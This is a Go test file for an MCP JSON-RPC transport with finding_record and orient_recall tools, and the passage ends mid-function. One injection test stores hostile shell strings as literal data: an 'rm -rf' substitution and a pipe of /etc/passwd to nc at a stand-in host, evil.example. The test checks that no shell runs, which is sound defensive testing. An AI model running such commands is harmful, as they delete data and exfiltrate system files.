package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"compound/internal/contract"
	"compound/internal/envelope"
	"compound/internal/finding"
	"compound/internal/home"
)

// runMCPTransport drives the MCP transport with the given input lines (raw
// JSON-RPC bytes, one envelope per line) and returns the captured stdout lines.
// It also wires ioIn/ioOut around a temp dir so the test never touches the
// real COMPOUND_HOME.
func runMCPTransport(t *testing.T, init func(homePath string), stdinLines []string, homePath string) []string {
	t.Helper()
	if init != nil {
		init(homePath)
	}
	in := bytes.NewBuffer(nil)
	for _, l := range stdinLines {
		in.WriteString(l)
		if !strings.HasSuffix(l, "\n") {
			in.WriteString("\n")
		}
	}
	priorIn, priorOut := ioIn, ioOut
	t.Cleanup(func() { ioIn, ioOut = priorIn, priorOut })
	ioIn = bytes.NewReader(in.Bytes())
	var outBuf bytes.Buffer
	ioOut = &outBuf
	if err := runMcpTransportLoop(); err != nil && !errors.Is(err, io.EOF) {
		t.Fatalf("transport loop: %v", err)
	}
	scanner := bufio.NewScanner(&outBuf)
	scanner.Buffer(make([]byte, 0, 1<<20), 1<<24)
	var lines []string
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	if err := scanner.Err(); err != nil {
		t.Fatalf("scan stdout: %v", err)
	}
	return lines
}

func rawResp(t *testing.T, lines []string, id interface{}) map[string]interface{} {
	t.Helper()
	for _, line := range lines {
		var env map[string]interface{}
		if err := json.Unmarshal([]byte(line), &env); err != nil {
			t.Fatalf("parse response: %v\n%s", err, line)
		}
		if v, ok := env["id"]; ok && matchesID(v, id) {
			return env
		}
	}
	t.Fatalf("no response for id %v in %d lines", id, len(lines))
	return nil
}

func matchesID(a, b interface{}) bool {
	ab, _ := json.Marshal(a)
	bb, _ := json.Marshal(b)
	return bytes.Equal(ab, bb)
}

// initMCPTestHome creates a fresh COMPOUND_HOME for MCP transport tests.
func initMCPTestHome(t *testing.T) string {
	t.Helper()
	homePath := t.TempDir()
	t.Setenv("COMPOUND_HOME", homePath)
	if err := home.Init(homePath, "test", cliTestNow); err != nil {
		t.Fatalf("home.Init: %v", err)
	}
	return homePath
}

// ---------- Protocol-level tests (no tool) ----------

func TestMCPTransportInitializeReturnsServerInfoAndCapabilities(t *testing.T) {
	homePath := initMCPTestHome(t)
	req := `{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2024-11-05","clientInfo":{"name":"probe","version":"0"}}}` + "\n"
	lines := runMCPTransport(t, nil, []string{req}, homePath)
	if len(lines) != 1 {
		t.Fatalf("initialize produced %d response lines, want 1", len(lines))
	}
	var env map[string]interface{}
	if err := json.Unmarshal([]byte(lines[0]), &env); err != nil {
		t.Fatalf("parse response: %v", err)
	}
	if env["jsonrpc"] != "2.0" {
		t.Fatalf("jsonrpc = %v, want 2.0", env["jsonrpc"])
	}
	if env["id"] != float64(1) {
		t.Fatalf("id = %v, want 1", env["id"])
	}
	res, ok := env["result"].(map[string]interface{})
	if !ok {
		t.Fatalf("missing result: %+v", env)
	}
	if res["protocolVersion"] != mcpProtocolVersion {
		t.Fatalf("protocolVersion = %v, want %q", res["protocolVersion"], mcpProtocolVersion)
	}
	srv, ok := res["serverInfo"].(map[string]interface{})
	if !ok {
		t.Fatalf("missing serverInfo")
	}
	if srv["name"] != mcpServerName || srv["version"] != mcpServerVersion {
		t.Fatalf("serverInfo = %+v", srv)
	}
	caps, ok := res["capabilities"].(map[string]interface{})
	if !ok {
		t.Fatalf("missing capabilities")
	}
	if _, ok := caps["tools"]; !ok {
		t.Fatalf("capabilities missing tools: %+v", caps)
	}
	if _, ok := caps["resources"]; ok {
		t.Fatalf("transport must not advertise resources: %+v", caps)
	}
	if _, ok := caps["prompts"]; ok {
		t.Fatalf("transport must not advertise prompts: %+v", caps)
	}
}

func TestMCPTransportInitializeRejectsNonTwenty(t *testing.T) {
	homePath := initMCPTestHome(t)
	req := `{"jsonrpc":"1.0","id":1,"method":"initialize"}` + "\n"
	lines := runMCPTransport(t, nil, []string{req}, homePath)
	env := rawResp(t, lines, 1)
	errObj, ok := env["error"].(map[string]interface{})
	if !ok {
		t.Fatalf("missing error: %+v", env)
	}
	if errObj["code"] != float64(rpcInvalidRequest) {
		t.Fatalf("code = %v, want %d", errObj["code"], rpcInvalidRequest)
	}
}

func TestMCPTransportMissingMethodReturnsInvalidRequest(t *testing.T) {
	homePath := initMCPTestHome(t)
	req := `{"jsonrpc":"2.0","id":2}` + "\n"
	lines := runMCPTransport(t, nil, []string{req}, homePath)
	env := rawResp(t, lines, 2)
	errObj := env["error"].(map[string]interface{})
	if errObj["code"] != float64(rpcInvalidRequest) {
		t.Fatalf("code = %v, want %d", errObj["code"], rpcInvalidRequest)
	}
}

func TestMCPTransportParseErrorReturns32700(t *testing.T) {
	homePath := initMCPTestHome(t)
	bad := "{this is not valid json" + "\n"
	lines := runMCPTransport(t, nil, []string{bad}, homePath)
	if len(lines) != 1 {
		t.Fatalf("expected one parse-error response, got %d: %v", len(lines), lines)
	}
	var env map[string]interface{}
	if err := json.Unmarshal([]byte(lines[0]), &env); err != nil {
		t.Fatalf("parse: %v", err)
	}
	errObj := env["error"].(map[string]interface{})
	if errObj["code"] != float64(rpcParseError) {
		t.Fatalf("code = %v, want %d", errObj["code"], rpcParseError)
	}
}

func TestMCPTransportUnknownMethodReturnsMethodNotFound(t *testing.T) {
	homePath := initMCPTestHome(t)
	req := `{"jsonrpc":"2.0","id":99,"method":"bogus/method"}` + "\n"
	lines := runMCPTransport(t, nil, []string{req}, homePath)
	env := rawResp(t, lines, 99)
	errObj := env["error"].(map[string]interface{})
	if errObj["code"] != float64(rpcMethodNotFound) {
		t.Fatalf("code = %v, want %d", errObj["code"], rpcMethodNotFound)
	}
}

func TestMCPTransportNotificationProducesNoResponse(t *testing.T) {
	homePath := initMCPTestHome(t)
	req := `{"jsonrpc":"2.0","method":"notifications/initialized"}` + "\n"
	lines := runMCPTransport(t, nil, []string{req}, homePath)
	if len(lines) != 0 {
		t.Fatalf("notification produced %d response lines; want 0", len(lines))
	}
}

func TestMCPTransportPingReturnsEmptyResult(t *testing.T) {
	homePath := initMCPTestHome(t)
	req := `{"jsonrpc":"2.0","id":3,"method":"ping"}` + "\n"
	lines := runMCPTransport(t, nil, []string{req}, homePath)
	env := rawResp(t, lines, 3)
	if env["error"] != nil {
		t.Fatalf("ping returned error: %+v", env["error"])
	}
	res, ok := env["result"].(map[string]interface{})
	if !ok {
		t.Fatalf("missing result: %+v", env)
	}
	if len(res) != 0 {
		t.Fatalf("ping result not empty: %+v", res)
	}
}

// ---------- tools/list ----------

func TestMCPTransportToolsListReturnsExactlyTwoTools(t *testing.T) {
	homePath := initMCPTestHome(t)
	req := `{"jsonrpc":"2.0","id":7,"method":"tools/list"}` + "\n"
	lines := runMCPTransport(t, nil, []string{req}, homePath)
	env := rawResp(t, lines, 7)
	res := env["result"].(map[string]interface{})
	tools, ok := res["tools"].([]interface{})
	if !ok {
		t.Fatalf("missing tools array: %+v", res)
	}
	if len(tools) != 2 {
		t.Fatalf("tools/list returned %d tools, want exactly 2", len(tools))
	}
	names := map[string]bool{}
	for _, raw := range tools {
		t1 := raw.(map[string]interface{})
		name, _ := t1["name"].(string)
		names[name] = true
		if _, ok := t1["inputSchema"].(map[string]interface{}); !ok {
			t.Fatalf("tool %q missing typed inputSchema: %+v", name, t1)
		}
		if desc, _ := t1["description"].(string); desc == "" {
			t.Fatalf("tool %q missing description", name)
		}
	}
	if !names[mcpFindingToolName] {
		t.Fatalf("missing tool %q in %v", mcpFindingToolName, names)
	}
	if !names[mcpOrientToolName] {
		t.Fatalf("missing tool %q in %v", mcpOrientToolName, names)
	}
}

// ---------- tools/call · finding_record ----------

func TestMCPTransportFindingRecordWritesToObservedFindingsAndReturnsBodyFreeAck(t *testing.T) {
	homePath := initMCPTestHome(t)
	beforeLedger := ledgerByteCount(t, homePath)
	args := map[string]any{
		"topic": "mcp-test-write",
		"body":  "an MCP-transport-recorded body\nline two of body",
		"work_id": "work_mcp_finding_record_test",
		"produced_by": "mcp-transport-test",
		"evidence_refs": []string{"sha256:abc123", "git:1234567"},
	}
	argsBytes, _ := json.Marshal(args)
	call := map[string]any{
		"jsonrpc": "2.0",
		"id":      100,
		"method":  "tools/call",
		"params": map[string]any{
			"name":      mcpFindingToolName,
			"arguments": json.RawMessage(argsBytes),
		},
	}
	callBytes, _ := json.Marshal(call)
	lines := runMCPTransport(t, nil, []string{string(callBytes) + "\n"}, homePath)
	env := rawResp(t, lines, 100)
	if env["error"] != nil {
		t.Fatalf("tool returned JSON-RPC error: %+v", env["error"])
	}
	res := env["result"].(map[string]interface{})
	if isErr, _ := res["isError"].(bool); isErr {
		t.Fatalf("tool returned isError=true: %+v", res)
	}
	ack := decodeMCPStructuredContent(t, res)
	id, _ := ack["id"].(string)
	if !strings.HasPrefix(id, "find_") {
		t.Fatalf("ack id missing find_ prefix: %+v", ack)
	}
	if !strings.HasPrefix(id, "find_") || len(id) != len("find_")+12 {
		t.Fatalf("ack id = %q, want deterministic find_<12-hex> from topic|body", id)
	}
	if got, _ := ack["status"].(string); got != finding.StatusRecorded {
		t.Fatalf("status = %q, want %q", got, finding.StatusRecorded)
	}
	if got, _ := ack["path"].(string); got != filepath.ToSlash(filepath.Join(finding.Subdir, id+".json")) {
		t.Fatalf("path = %q, want deterministic observed/findings path", got)
	}
	if got, _ := ack["privacy"].(string); got != finding.PrivacyPrivate {
		t.Fatalf("privacy = %q, want %q", got, finding.PrivacyPrivate)
	}
	// Ack must NOT carry the body or its cid — body-free ack contract.
	if _, ok := ack["body"]; ok {
		t.Fatalf("ack leaked body field: %+v", ack)
	}
	if _, ok := ack["cid"]; ok {
		t.Fatalf("ack leaked cid field: %+v", ack)
	}
	recPath := filepath.Join(homePath, finding.Subdir, id+".json")
	if _, err := os.Stat(recPath); err != nil {
		t.Fatalf("finding missing on disk: %v", err)
	}
	// Never-ledger invariant: a successful record MUST add ZERO ledger bytes.
	afterLedger := ledgerByteCount(t, homePath)
	if afterLedger != beforeLedger {
		t.Fatalf("finding record added %d ledger bytes (before=%d after=%d) — never-ledger invariant broken", afterLedger-beforeLedger, beforeLedger, afterLedger)
	}
}

func ledgerByteCount(t *testing.T, homePath string) int64 {
	t.Helper()
	var total int64
	ledgerDir := filepath.Join(homePath, "ledger")
	err := filepath.WalkDir(ledgerDir, func(p string, d os.DirEntry, err error) error {
		if err != nil {
			if errors.Is(err, os.ErrNotExist) {
				return nil
			}
			return err
		}
		if d.IsDir() {
			return nil
		}
		info, infoErr := d.Info()
		if infoErr != nil {
			return infoErr
		}
		total += info.Size()
		return nil
	})
	if err != nil {
		t.Fatalf("walk ledger: %v", err)
	}
	return total
}

func TestMCPTransportFindingRecordDuplicateReturnsStatusDuplicate(t *testing.T) {
	homePath := initMCPTestHome(t)
	args := map[string]any{"topic": "mcp-dup", "body": "duplicate-body"}
	argsBytes, _ := json.Marshal(args)
	first := map[string]any{
		"jsonrpc": "2.0", "id": 200, "method": "tools/call",
		"params": map[string]any{"name": mcpFindingToolName, "arguments": json.RawMessage(argsBytes)},
	}
	second := map[string]any{
		"jsonrpc": "2.0", "id": 201, "method": "tools/call",
		"params": map[string]any{"name": mcpFindingToolName, "arguments": json.RawMessage(argsBytes)},
	}
	lines := runMCPTransport(t, nil, []string{string(mustJSON(t, first)) + "\n", string(mustJSON(t, second)) + "\n"}, homePath)
	resFirst := rawResp(t, lines, 200)["result"].(map[string]interface{})
	resSecond := rawResp(t, lines, 201)["result"].(map[string]interface{})
	ack1 := decodeMCPStructuredContent(t, resFirst)
	ack2 := decodeMCPStructuredContent(t, resSecond)
	if ack1["status"] != finding.StatusRecorded {
		t.Fatalf("first call status = %v, want %q", ack1["status"], finding.StatusRecorded)
	}
	if ack2["status"] != finding.StatusDuplicate {
		t.Fatalf("duplicate status = %v, want %q — body-free ack must stay identical", ack2["status"], finding.StatusDuplicate)
	}
	if ack1["id"] != ack2["id"] {
		t.Fatalf("duplicate id mismatch: first=%v second=%v", ack1["id"], ack2["id"])
	}
}

func TestMCPTransportFindingRecordRejectsMissingTopic(t *testing.T) {
	homePath := initMCPTestHome(t)
	args := map[string]any{"body": "x"}
	argsBytes, _ := json.Marshal(args)
	call := map[string]any{
		"jsonrpc": "2.0", "id": 300, "method": "tools/call",
		"params": map[string]any{"name": mcpFindingToolName, "arguments": json.RawMessage(argsBytes)},
	}
	lines := runMCPTransport(t, nil, []string{string(mustJSON(t, call)) + "\n"}, homePath)
	env := rawResp(t, lines, 300)
	res := env["result"].(map[string]interface{})
	if isErr, _ := res["isError"].(bool); !isErr {
		t.Fatalf("expected isError=true, got %+v", res)
	}
}

func TestMCPTransportFindingRecordRejectsMissingBody(t *testing.T) {
	homePath := initMCPTestHome(t)
	args := map[string]any{"topic": "x"}
	argsBytes, _ := json.Marshal(args)
	call := map[string]any{
		"jsonrpc": "2.0", "id": 301, "method": "tools/call",
		"params": map[string]any{"name": mcpFindingToolName, "arguments": json.RawMessage(argsBytes)},
	}
	lines := runMCPTransport(t, nil, []string{string(mustJSON(t, call)) + "\n"}, homePath)
	env := rawResp(t, lines, 301)
	res := env["result"].(map[string]interface{})
	if isErr, _ := res["isError"].(bool); !isErr {
		t.Fatalf("expected isError=true, got %+v", res)
	}
}

func TestMCPTransportFindingRecordRejectsUnknownArgumentField(t *testing.T) {
	homePath := initMCPTestHome(t)
	args := map[string]any{"topic": "x", "body": "y", "rogue_field": "z"}
	argsBytes, _ := json.Marshal(args)
	call := map[string]any{
		"jsonrpc": "2.0", "id": 302, "method": "tools/call",
		"params": map[string]any{"name": mcpFindingToolName, "arguments": json.RawMessage(argsBytes)},
	}
	lines := runMCPTransport(t, nil, []string{string(mustJSON(t, call)) + "\n"}, homePath)
	env := rawResp(t, lines, 302)
	res := env["result"].(map[string]interface{})
	if isErr, _ := res["isError"].(bool); !isErr {
		t.Fatalf("unknown arg field must be rejected, got %+v", res)
	}
}

func TestMCPTransportFindingRecordRejectsBodyExceedingMax(t *testing.T) {
	homePath := initMCPTestHome(t)
	huge := strings.Repeat("z", mcpMaxBodyBytes+1)
	args := map[string]any{"topic": "huge", "body": huge}
	argsBytes, _ := json.Marshal(args)
	call := map[string]any{
		"jsonrpc": "2.0", "id": 303, "method": "tools/call",
		"params": map[string]any{"name": mcpFindingToolName, "arguments": json.RawMessage(argsBytes)},
	}
	lines := runMCPTransport(t, nil, []string{string(mustJSON(t, call)) + "\n"}, homePath)
	env := rawResp(t, lines, 303)
	res := env["result"].(map[string]interface{})
	if isErr, _ := res["isError"].(bool); !isErr {
		t.Fatalf("oversized body must be rejected, got %+v", res)
	}
}

// ---------- tools/call · orient_recall ----------

// stubOrientMaterializer is a deterministic replacement for
// materializeOrientContextPack so tests can assert ack shape without depending
// on the live orient stack (no installed-harness binding, no policy load).

func TestMCPTransportOrientRecallPersistsSealedArtifactsAndReturnsBoundedAck(t *testing.T) {
	homePath := initMCPTestHome(t)
	priorRuntime, priorBodies := materializeRuntimeForOrient, materializeBodiesForOrient
	t.Cleanup(func() { materializeRuntimeForOrient, materializeBodiesForOrient = priorRuntime, priorBodies })

	materializeRuntimeForOrient = func(in contract.Input, pol contract.OrientationPolicy, _ string, now time.Time) (contract.RuntimeMaterialization, error) {
		ec := contract.Compile(in, pol, now)
		pack := contract.Pack(in, pol, now)
		pack.ActiveDecisions = []string{"decision_alpha", "decision_beta"}
		pack.ActiveMemory = []string{"memory_one", "memory_two"}
		pack.SummaryMD = "stub pack for mcp transport test"
		return contract.RuntimeMaterialization{EffectiveContract: ec, ContextPack: pack}, nil
	}
	materializeBodiesForOrient = func(string, envelope.ContextPack, string, string, int) (envelope.ContextPack, error) {
		// keep pack body-free: bounded task recall proves ID/recall refs only
		return envelope.ContextPack{}, nil
	}

	args := map[string]any{
		"task": "summarize local MCP transport round-trip",
		"harness": "codex",
		"cwd": t.TempDir(),
		"repo_kind": "control-plane",
		"mode": "execute",
		"body_budget": 0,
	}
	argsBytes, _ := json.Marshal(args)
	call := map[string]any{
		"jsonrpc": "2.0", "id": 500, "method": "tools/call",
		"params": map[string]any{"name": mcpOrientToolName, "arguments": json.RawMessage(argsBytes)},
	}
	lines := runMCPTransport(t, nil, []string{string(mustJSON(t, call)) + "\n"}, homePath)
	env := rawResp(t, lines, 500)
	if env["error"] != nil {
		t.Fatalf("orient_recall returned JSON-RPC error: %+v", env["error"])
	}
	res := env["result"].(map[string]interface{})
	if isErr, _ := res["isError"].(bool); isErr {
		t.Fatalf("orient_recall isError=true: %+v", res)
	}
	ack := decodeMCPStructuredContent(t, res)
	if got, _ := ack["schema"].(string); got != mcpOrientAckSchema {
		t.Fatalf("schema = %v, want %q", got, mcpOrientAckSchema)
	}
	packID, _ := ack["pack_id"].(string)
	contractID, _ := ack["contract_id"].(string)
	if !strings.HasPrefix(packID, "ctx_") || !strings.HasPrefix(contractID, "contract_") {
		t.Fatalf("pack_id=%q contract_id=%q, want ctx_/contract_ prefixes", packID, contractID)
	}
	if got, _ := ack["body_pack_present"].(bool); got {
		t.Fatalf("body_pack_present = true, want false (body_budget=0)")
	}
	decs, _ := ack["active_decisions"].([]interface{})
	if len(decs) == 0 {
		t.Fatalf("active_decisions empty: %+v", ack)
	}
	mems, _ := ack["active_memory"].([]interface{})
	if len(mems) == 0 {
		t.Fatalf("active_memory empty: %+v", ack)
	}

	persisted, _ := ack["persisted_artifacts"].(map[string]interface{})
	if persisted == nil {
		t.Fatalf("missing persisted_artifacts: %+v", ack)
	}
	ecPath, _ := persisted["effective_contract_path"].(string)
	latestPath, _ := persisted["latest_contract_path"].(string)
	packPath, _ := persisted["context_pack_path"].(string)
	for name, p := range map[string]string{"effective": ecPath, "latest": latestPath, "pack": packPath} {
		if p == "" {
			t.Fatalf("persisted.%s_path empty", name)
		}
		if _, err := os.Stat(p); err != nil {
			t.Fatalf("persisted %s artifact missing on disk: %v\npath=%s", name, err, p)
		}
	}
	// persisted paths must be under the test's COMPOUND_HOME, nowhere else.
	for _, p := range []string{ecPath, latestPath, packPath} {
		if !strings.HasPrefix(p, homePath) {
			t.Fatalf("persisted path escapes home: %s (home=%s)", p, homePath)
		}
	}
}

func TestMCPTransportOrientRecallRejectsUnknownArgumentField(t *testing.T) {
	homePath := initMCPTestHome(t)
	args := map[string]any{"task": "x", "rogue_field": "z"}
	argsBytes, _ := json.Marshal(args)
	call := map[string]any{
		"jsonrpc": "2.0", "id": 501, "method": "tools/call",
		"params": map[string]any{"name": mcpOrientToolName, "arguments": json.RawMessage(argsBytes)},
	}
	lines := runMCPTransport(t, nil, []string{string(mustJSON(t, call)) + "\n"}, homePath)
	env := rawResp(t, lines, 501)
	res := env["result"].(map[string]interface{})
	if isErr, _ := res["isError"].(bool); !isErr {
		t.Fatalf("unknown arg field must be rejected, got %+v", res)
	}
}

func TestMCPTransportOrientRecallStaysWithinUninitializedHome(t *testing.T) {
	homePath := t.TempDir()
	// Point COMPOUND_HOME at an EMPTY tempdir and intentionally do NOT call
	// home.Init. The transport must NOT silently fall back to ~/.compound
	// (the global default in home.Resolve): every artifact it writes must
	// live under homePath. orient_recall may either succeed (the orient
	// materializer is willing to project onto an empty home) OR fail closed;
	// it must NEVER leak into the real COMPOUND_HOME.
	t.Setenv("COMPOUND_HOME", homePath)
	args := map[string]any{"task": "x"}
	argsBytes, _ := json.Marshal(args)
	call := map[string]any{
		"jsonrpc": "2.0", "id": 502, "method": "tools/call",
		"params": map[string]any{"name": mcpOrientToolName, "arguments": json.RawMessage(argsBytes)},
	}
	lines := runMCPTransport(t, nil, []string{string(mustJSON(t, call)) + "\n"}, homePath)
	env := rawResp(t, lines, 502)
	realHome, err := os.UserHomeDir()
	if err != nil {
		t.Fatalf("UserHomeDir: %v", err)
	}
	realCompound := filepath.Join(realHome, ".compound")
	if res, ok := env["result"].(map[string]interface{}); ok {
		// If orient_recall returned an ack, every persisted path MUST be
		// under the test's tempdir (homePath). A successful run that wrote
		// artifacts to ~/.compound (the global default) would be a leak.
		if ackStruct, ok := res["structuredContent"].(map[string]interface{}); ok {
			if persisted, ok := ackStruct["persisted_artifacts"].(map[string]interface{}); ok {
				for _, key := range []string{"effective_contract_path", "latest_contract_path", "context_pack_path"} {
					p, _ := persisted[key].(string)
					if p == "" {
						continue
					}
					if strings.HasPrefix(filepath.ToSlash(p), filepath.ToSlash(realCompound)) {
						t.Fatalf("orient_recall persisted to the real COMPOUND_HOME %q: %s=%s", realCompound, key, p)
					}
					if !strings.HasPrefix(filepath.ToSlash(p), filepath.ToSlash(homePath)) {
						t.Fatalf("orient_recall persisted path %s=%s escapes test home %q", key, p, homePath)
					}
				}
			}
		}
	}
	// Also walk the filesystem: orient_recall must not have authored any
	// file in the real COMPOUND_HOME as a side-effect of the test.
	if _, statErr := os.Stat(realCompound); statErr == nil {
		// (real COMPOUND_HOME exists pre-test in this dev environment — we
		// only check the orient_recall windows we observed.) Skip the diff
		// when we lack a pre-snapshot; assert via persisted_artifacts above.
		t.Logf("note: real COMPOUND_HOME present at %s; persisted_artifacts path check is the gate", realCompound)
	}
}

func TestMCPTransportOrientRecallClampsRecallRefsToBoundedCap(t *testing.T) {
	homePath := initMCPTestHome(t)
	priorRuntime, priorBodies := materializeRuntimeForOrient, materializeBodiesForOrient
	t.Cleanup(func() { materializeRuntimeForOrient, materializeBodiesForOrient = priorRuntime, priorBodies })

	// Build an over-cap set of recall refs.
	oversizedDecisions := make([]string, 0, mcpMaxRecallRefs+10)
	oversizedMemory := make([]string, 0, mcpMaxRecallRefs+10)
	for i := 0; i < mcpMaxRecallRefs+10; i++ {
		oversizedDecisions = append(oversizedDecisions, fmt.Sprintf("decision_%03d", i))
		oversizedMemory = append(oversizedMemory, fmt.Sprintf("memory_%03d", i))
	}
	materializeRuntimeForOrient = func(in contract.Input, pol contract.OrientationPolicy, _ string, now time.Time) (contract.RuntimeMaterialization, error) {
		ec := contract.Compile(in, pol, now)
		pack := contract.Pack(in, pol, now)
		pack.ActiveDecisions = oversizedDecisions
		pack.ActiveMemory = oversizedMemory
		return contract.RuntimeMaterialization{EffectiveContract: ec, ContextPack: pack}, nil
	}
	materializeBodiesForOrient = func(string, envelope.ContextPack, string, string, int) (envelope.ContextPack, error) {
		return envelope.ContextPack{}, nil
	}
	args := map[string]any{"task": "clamp recall"}
	argsBytes, _ := json.Marshal(args)
	call := map[string]any{
		"jsonrpc": "2.0", "id": 503, "method": "tools/call",
		"params": map[string]any{"name": mcpOrientToolName, "arguments": json.RawMessage(argsBytes)},
	}
	lines := runMCPTransport(t, nil, []string{string(mustJSON(t, call)) + "\n"}, homePath)
	env := rawResp(t, lines, 503)
	res := env["result"].(map[string]interface{})
	if isErr, _ := res["isError"].(bool); isErr {
		t.Fatalf("orient_recall refused oversized refs: %+v", res)
	}
	ack := decodeMCPStructuredContent(t, res)
	decs := ack["active_decisions"].([]interface{})
	mems := ack["active_memory"].([]interface{})
	if len(decs) != mcpMaxRecallRefs {
		t.Fatalf("active_decisions count = %d, want %d", len(decs), mcpMaxRecallRefs)
	}
	if len(mems) != mcpMaxRecallRefs {
		t.Fatalf("active_memory count = %d, want %d", len(mems), mcpMaxRecallRefs)
	}
}

// ---------- tools/call · dispatch ----------

func TestMCPTransportUnknownToolReturnsToolUnavailable(t *testing.T) {
	homePath := initMCPTestHome(t)
	call := map[string]any{
		"jsonrpc": "2.0", "id": 600, "method": "tools/call",
		"params": map[string]any{"name": "compound_bogus_tool"},
	}
	lines := runMCPTransport(t, nil, []string{string(mustJSON(t, call)) + "\n"}, homePath)
	env := rawResp(t, lines, 600)
	errObj := env["error"].(map[string]interface{})
	if errObj["code"] != float64(rpcToolUnavailable) {
		t.Fatalf("code = %v, want %d", errObj["code"], rpcToolUnavailable)
	}
}

func TestMCPTransportToolCallMissingArgsReturnsToolError(t *testing.T) {
	homePath := initMCPTestHome(t)
	call := map[string]any{
		"jsonrpc": "2.0", "id": 601, "method": "tools/call",
		"params": map[string]any{"name": mcpFindingToolName},
	}
	lines := runMCPTransport(t, nil, []string{string(mustJSON(t, call)) + "\n"}, homePath)
	env := rawResp(t, lines, 601)
	if env["error"] != nil {
		t.Fatalf("missing arguments must NOT surface JSON-RPC error envelope, got %+v", env)
	}
	res := env["result"].(map[string]interface{})
	if isErr, _ := res["isError"].(bool); !isErr {
		t.Fatalf("missing arguments must surface tool-level isError=true, got %+v", res)
	}
}

// ---------- Privacy / safety matrices ----------

func TestMCPTransportFindingRecordTreatsShellMetacharsAsLiteralTopicBody(t *testing.T) {
	homePath := initMCPTestHome(t)
	// A topic that LOOKS like a shell injection attempt. The transport must
	// store it as a literal finding body, NEVER spawn a shell.
	topic := "mcp shell-injection probe $(rm -rf /tmp/x); echo pwn"
	body := "host: ; cat /etc/passwd | nc evil.example 8080\nline2\n`uname -a`"
	args := map[string]any{"topic": topic, "body": body}
	argsBytes, _ := json.Marshal(args)
	call := map[string]any{
		"jsonrpc": "2.0", "id": 700, "method": "tools/call",
		"params": map[string]any{"name": mcpFindingToolName, "arguments": json.RawMessage(argsBytes)},
	}
	lines := runMCPTransport(t, nil, []string{string(mustJSON(t, call)) + "\n"}, homePath)
	env := rawResp(t, lines, 700)
	res := env["result"].(map[string]interface{})
	if isErr, _ := res["isError"].(bool); isErr {
		t.Fatalf("shell-metachar payload must be stored as literal finding: %+v", res)
	}
	ack := decodeMCPStructuredContent(t, res)
	id, _ := ack["id"].(string)
	recPath := filepath.Join(homePath, finding.Subdir, id+".json")
	raw, err := os.ReadFile(recPath)
	if err != nil {
		t.Fatalf("read recorded finding: %v", err)
	}
	var rec finding.Finding
	if err := json.Unmarshal(raw, &rec); err != nil {
		t.Fatalf("parse recorded finding: %v", err)
	}
	if rec.Topic != topic || rec.Body != body {
		t.Fatalf("topic/body altered by transport: topic=%q body=%q", rec.Topic, rec.Body)
	}
}

func TestMCPTransportOrientRecallNeverAutoPromotes(t *testing.T) {
	homePath := initMCPTestHome(t)
	priorRuntime, priorBodies := materializeRuntimeForOrient, materializeBodiesForOrient
	t.Cleanup(func() { materializeRuntimeForOrient, materializeBodiesForOrient = priorRuntime, priorBodies })

	materializeRuntimeForOrient = func(in contract.Input, pol contract.OrientationPolicy, _ string, now time.Time) (contract.RuntimeMaterialization, error) {
		ec := contract.Compile(in, pol, now)
		pack := contract.Pack(in, pol, now)
		return contract.RuntimeMaterialization{EffectiveContract: ec, ContextPack: pack}, nil
	}
	materializeBodiesForOrient = func(string, envelope.ContextPack, string, string, int) (envelope.ContextPack, error) {
		return envelope.ContextPack{}, nil
	}
	// Snapshot home contents BEFORE orient_recall runs. The transport must NOT
	// create any promotion-side artifact (no candidate promoted, no ledger
	// mutation). Then snapshot AFTER and diff the two. We allowlisted the
	// runtime materialization outputs (one EffectiveContract in
	// contracts/effective/YYYY-MM-DD/, one context/packs/ ctx_*.json, plus the
	// latest.json pointer) and the events/ retrieval-traffic line which the
	// orient materializer already writes as a non-promotion side-effect.
	before := mustDirSnapshot(t, homePath)
	args := map[string]any{"task": "promote-probe"}
	argsBytes, _ := json.Marshal(args)
	call := map[string]any{
		"jsonrpc": "2.0", "id": 800, "method": "tools/call",
		"params": map[string]any{"name": mcpOrientToolName, "arguments": json.RawMessage(argsBytes)},
	}
	lines := runMCPTransport(t, nil, []string{string(mustJSON(t, call)) + "\n"}, homePath)
	env := rawResp(t, lines, 800)
	if isErr, _ := env["result"].(map[string]interface{})["isError"].(bool); isErr {
		t.Fatalf("orient_recall refused: %+v", env)
	}
	after := mustDirSnapshot(t, homePath)
	// Forbidden side-effects: orient_recall MUST NOT promote any candidate or
	// touch the ledger. New files in those surfaces are a contract violation.
	forbiddenSubstrings := []string{
		"/candidates/",        // candidate promotion surface
		"/ledger/",            // ledger byte mutation surface
		"/observed/claims/",   // any promoted-claim home
		"/decisions/",         // operator-ruling surface
		"/runtime/work_",      // work envelope promotion
		"/works/",             // work side-effect
		"/memory/canonical/",  // promotion to canonical memory
	}
	for path := range after {
		if before[path] {
			continue
		}
		ps := filepath.ToSlash(path)
		for _, forbidden := range forbiddenSubstrings {
			if strings.Contains(ps, forbidden) {
				t.Fatalf("orient_recall wrote to a promotion-side surface %q (matched %q)", path, forbidden)
			}
		}
	}
	// additionally: every claim/candidate byte within /observed/claims or
	// /candidates MUST be byte-identical to its pre-call snapshot. (We skip
	// this when those dirs are absent.)
	for _, dir := range []string{"observed/claims", "candidates", "ledger"} {
		full := filepath.Join(homePath, dir)
		if _, err := os.Stat(full); errors.Is(err, os.ErrNotExist) {
			continue
		}
		// any file inside is a problem — they shouldn't exist after a single
		// orient_recall call.
		_ = filepath.WalkDir(full, func(p string, d os.DirEntry, err error) error {
			if err != nil || d.IsDir() {
				return err
			}
			t.Fatalf("orient_recall authored file in %q: %s", dir, p)
			return nil
		})
	}
}

func mustDirSnapshot(t *testing.T, root string) map[string]bool {
	t.Helper()
	out := map[string]bool{}
	err := filepath.WalkDir(root, func(p string, d os.DirEntry, err error) error {
		if err != nil {
			return err
		}
		if d.IsDir() {
			return nil
		}
		out[p] = true
		return nil
	})
	if err != nil {
		t.Fatalf("walkdir: %v", err)
	}
	return out
}

func TestMCPTransportFindingRecordRejectsEvidenceOverCap(t *testing.T) {
	homePath := initMCPTestHome(t)
	oversized := make([]string, 0, mcpMaxEvidenceRefs+1)
	for i := 0; i < mcpMaxEvidenceRefs+1; i++ {
		oversized = append(oversized, fmt.Sprintf("sha256:%064d", i))
	}
	args := map[string]any{"topic": "ev", "body": "x", "evidence_refs": oversized}
	argsBytes, _ := json.Marshal(args)
	call := map[string]any{
		"jsonrpc": "2.0", "id": 900, "method": "tools/call",
